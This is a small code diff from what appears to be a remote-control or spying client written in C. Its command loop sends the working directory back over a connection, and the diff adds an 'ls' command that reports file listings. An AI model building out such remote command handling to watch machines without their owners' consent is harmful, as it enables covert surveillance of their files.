@@ -47,8 +47,9 @@ int main() {
             memset(pwd_buff, 0, sizeof(pwd_buff));
             pwd(pwd_buff, sizeof(pwd_buff));
             espia_send(&connection, pwd_buff, sizeof(pwd_buff));
+        } else if (strcmp(recv_buff, "ls") == 0) {
+            ls(&connection);
         }
-
     }
     /* ---------------------------------------------------- */
 
